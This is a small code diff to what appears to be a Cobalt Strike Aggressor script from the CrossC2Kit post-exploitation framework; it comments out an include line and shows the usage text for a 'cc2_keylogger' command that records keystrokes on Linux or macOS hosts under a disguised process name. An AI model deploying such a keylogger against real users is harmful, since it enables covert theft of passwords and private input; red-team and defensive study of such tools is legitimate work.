@@ -1,5 +1,5 @@
 
-include(script_resource("CrossC2Kit.cna"));
+# include(script_resource("CrossC2Kit.cna"));
 
 sub printUsage_keylogger {
     blog($1, "\nUsage: cc2_keylogger <linux(32)/osx> <process display name>\n\tlisten to the string entered by the user from the keyboard.\nEx:\n\tcc2_keylogger osx test");
